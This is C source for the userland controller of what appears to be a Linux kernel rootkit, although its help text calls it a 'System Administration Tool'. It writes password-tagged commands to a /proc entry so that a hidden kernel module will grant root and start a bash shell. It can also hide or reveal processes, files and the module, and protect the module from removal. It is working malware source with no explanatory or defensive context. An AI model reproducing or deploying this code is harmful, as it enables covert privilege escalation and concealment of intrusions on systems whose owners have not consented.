#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <getopt.h>
#include <unistd.h>
#include <errno.h>

#include "config.h"

// Command definitions
typedef enum {
    CMD_ROOT_ACCESS = 0,
    CMD_HIDE_PROCESS,
    CMD_UNHIDE_PROCESS, 
    CMD_HIDE_FILE,
    CMD_UNHIDE_FILE,
    CMD_HIDE_MODULE,
    CMD_UNHIDE_MODULE,
    CMD_PROTECT_MODULE,
    CMD_UNPROTECT_MODULE,
    CMD_HELP
} command_type_t;

typedef struct {
    command_type_t cmd;
    char *argument;
    int has_argument;
} command_options_t;

// Function prototypes
void display_usage(const char *program_name);
int parse_arguments(int argc, char *argv[], command_options_t *options);
size_t compute_message_size(const command_options_t *options);
void construct_message(const command_options_t *options, char *buffer, size_t size);
int execute_command(const char *message, size_t msg_size, int requires_shell);
void write_data_block(char **buffer, const char *data, size_t length);

int main(int argc, char *argv[])
{
    command_options_t user_cmd = {0};
    int parse_result;
    
    parse_result = parse_arguments(argc, argv, &user_cmd);
    if (parse_result != 0) {
        return parse_result;
    }
    
    if (user_cmd.cmd == CMD_HELP) {
        display_usage(argv[0]);
        return 0;
    }
    
    size_t message_length = compute_message_size(&user_cmd);
    char *command_message = malloc(message_length);
    if (!command_message) {
        fprintf(stderr, "Memory allocation failed\n");
        return EXIT_FAILURE;
    }
    
    construct_message(&user_cmd, command_message, message_length);
    
    int shell_required = (user_cmd.cmd == CMD_ROOT_ACCESS) ? 1 : 0;
    int result = execute_command(command_message, message_length, shell_required);
    
    free(command_message);
    return result;
}

void display_usage(const char *program_name)
{
    printf("System Administration Tool\n\n");
    printf("Usage: %s [OPTION]\n\n", program_name);
    printf("Available options:\n");
    printf("  --root-access           Execute shell with elevated privileges\n");
    printf("  --hide-process=PID      Conceal specified process ID\n");
    printf("  --unhide-process=PID    Reveal specified process ID\n");
    printf("  --hide-file=FILENAME    Conceal specified filename (name only)\n");
    printf("  --unhide-file=FILENAME  Reveal specified filename\n");
    printf("  --hide-module           Conceal system module\n");
    printf("  --unhide-module         Reveal system module\n");
    printf("  --protect-module        Enable module protection\n");
    printf("  --unprotect-module      Disable module protection\n");
    printf("  --help                  Display this help message\n\n");
}

int parse_arguments(int argc, char *argv[], command_options_t *options)
{
    if (argc < 2) {
        fprintf(stderr, "Error: No command specified\n\n");
        display_usage(argv[0]);
        return EXIT_FAILURE;
    }
    
    static struct option cmd_options[] = {
        {"root-access",    no_argument,       0, 'r'},
        {"hide-process",   required_argument, 0, 'h'},
        {"unhide-process", required_argument, 0, 'u'},
        {"hide-file",      required_argument, 0, 'f'},
        {"unhide-file",    required_argument, 0, 'g'},
        {"hide-module",    no_argument,       0, 'm'},
        {"unhide-module",  no_argument,       0, 'n'},
        {"protect-module", no_argument,       0, 'p'},
        {"unprotect-module", no_argument,     0, 'q'},
        {"help",           no_argument,       0, 'x'},
        {0, 0, 0, 0}
    };
    
    // Initialize options
    memset(options, 0, sizeof(command_options_t));
    options->cmd = CMD_HELP;
    
    int option_index = 0;
    int cmd_count = 0;
    int opt;
    
    opterr = 0;
    
    while ((opt = getopt_long(argc, argv, "", cmd_options, &option_index)) != -1) {
        cmd_count++;
        
        switch (opt) {
            case 'r':
                options->cmd = CMD_ROOT_ACCESS;
                break;
                
            case 'h':
                options->cmd = CMD_HIDE_PROCESS;
                options->argument = optarg;
                options->has_argument = 1;
                break;
                
            case 'u':
                options->cmd = CMD_UNHIDE_PROCESS;
                options->argument = optarg;
                options->has_argument = 1;
                break;
                
            case 'f':
                options->cmd = CMD_HIDE_FILE;
                options->argument = optarg;
                options->has_argument = 1;
                break;
                
            case 'g':
                options->cmd = CMD_UNHIDE_FILE;
                options->argument = optarg;
                options->has_argument = 1;
                break;
                
            case 'm':
                options->cmd = CMD_HIDE_MODULE;
                break;
                
            case 'n':
                options->cmd = CMD_UNHIDE_MODULE;
                break;
                
            case 'p':
                options->cmd = CMD_PROTECT_MODULE;
                break;
                
            case 'q':
                options->cmd = CMD_UNPROTECT_MODULE;
                break;
                
            case 'x':
                options->cmd = CMD_HELP;
                break;
                
            case '?':
                fprintf(stderr, "Error: Unknown option '%s'\n\n", argv[optind - 1]);
                display_usage(argv[0]);
                return EXIT_FAILURE;
                
            case ':':
                fprintf(stderr, "Error: Missing argument for '%s'\n\n", argv[optind - 1]);
                display_usage(argv[0]);
                return EXIT_FAILURE;
        }
    }
    
    if (cmd_count != 1) {
        fprintf(stderr, "Error: Specify exactly one command\n\n");
        display_usage(argv[0]);
        return EXIT_FAILURE;
    }
    
    return 0;
}

size_t compute_message_size(const command_options_t *options)
{
    size_t total_size = sizeof(CFG_PASS);
    
    switch (options->cmd) {
        case CMD_ROOT_ACCESS:
            total_size += sizeof(CFG_ROOT);
            break;
        case CMD_HIDE_PROCESS:
            total_size += sizeof(CFG_HIDE_PID) + strlen(options->argument);
            break;
        case CMD_UNHIDE_PROCESS:
            total_size += sizeof(CFG_UNHIDE_PID) + strlen(options->argument);
            break;
        case CMD_HIDE_FILE:
            total_size += sizeof(CFG_HIDE_FILE) + strlen(options->argument);
            break;
        case CMD_UNHIDE_FILE:
            total_size += sizeof(CFG_UNHIDE_FILE) + strlen(options->argument);
            break;
        case CMD_HIDE_MODULE:
            total_size += sizeof(CFG_HIDE);
            break;
        case CMD_UNHIDE_MODULE:
            total_size += sizeof(CFG_UNHIDE);
            break;
        case CMD_PROTECT_MODULE:
            total_size += sizeof(CFG_PROTECT);
            break;
        case CMD_UNPROTECT_MODULE:
            total_size += sizeof(CFG_UNPROTECT);
            break;
        default:
            break;
    }
    
    return total_size + 1; // Include null terminator
}

void construct_message(const command_options_t *options, char *buffer, size_t size)
{
    char *current_pos = buffer;
    
    // Add authentication token
    write_data_block(&current_pos, CFG_PASS, sizeof(CFG_PASS));
    
    // Add command and arguments
    switch (options->cmd) {
        case CMD_ROOT_ACCESS:
            write_data_block(&current_pos, CFG_ROOT, sizeof(CFG_ROOT));
            break;
        case CMD_HIDE_PROCESS:
            write_data_block(&current_pos, CFG_HIDE_PID, sizeof(CFG_HIDE_PID));
            write_data_block(&current_pos, options->argument, strlen(options->argument));
            break;
        case CMD_UNHIDE_PROCESS:
            write_data_block(&current_pos, CFG_UNHIDE_PID, sizeof(CFG_UNHIDE_PID));
            write_data_block(&current_pos, options->argument, strlen(options->argument));
            break;
        case CMD_HIDE_FILE:
            write_data_block(&current_pos, CFG_HIDE_FILE, sizeof(CFG_HIDE_FILE));
            write_data_block(&current_pos, options->argument, strlen(options->argument));
            break;
        case CMD_UNHIDE_FILE:
            write_data_block(&current_pos, CFG_UNHIDE_FILE, sizeof(CFG_UNHIDE_FILE));
            write_data_block(&current_pos, options->argument, strlen(options->argument));
            break;
        case CMD_HIDE_MODULE:
            write_data_block(&current_pos, CFG_HIDE, sizeof(CFG_HIDE));
            break;
        case CMD_UNHIDE_MODULE:
            write_data_block(&current_pos, CFG_UNHIDE, sizeof(CFG_UNHIDE));
            break;
        case CMD_PROTECT_MODULE:
            write_data_block(&current_pos, CFG_PROTECT, sizeof(CFG_PROTECT));
            break;
        case CMD_UNPROTECT_MODULE:
            write_data_block(&current_pos, CFG_UNPROTECT, sizeof(CFG_UNPROTECT));
            break;
        default:
            break;
    }
    
    buffer[size - 1] = '\0'; // Ensure null termination
}

void write_data_block(char **buffer, const char *data, size_t length)
{
    memcpy(*buffer, data, length);
    *buffer += length;
}

int execute_command(const char *message, size_t msg_size, int requires_shell)
{
    char proc_path[256];
    snprintf(proc_path, sizeof(proc_path), "/proc/%s", CFG_PROC_FILE);
    
    int file_desc = open(proc_path, O_RDONLY);
    
    if (file_desc < 0) {
        file_desc = open(proc_path, O_WRONLY);
        if (file_desc < 0) {
            fprintf(stderr, "Error: Cannot access %s: %s\n", 
                    proc_path, strerror(errno));
            return EXIT_FAILURE;
        }
        
        ssize_t written = write(file_desc, message, msg_size);
        if (written != msg_size) {
            fprintf(stderr, "Error: Failed to send command\n");
            close(file_desc);
            return EXIT_FAILURE;
        }
    } else {
        read(file_desc, (char*)message, msg_size);
    }
    
    close(file_desc);
    
    if (requires_shell) {
        execl("/bin/bash", "bash", NULL);
        fprintf(stderr, "Error: Failed to start shell\n");
        return EXIT_FAILURE;
    }
    
    return EXIT_SUCCESS;
}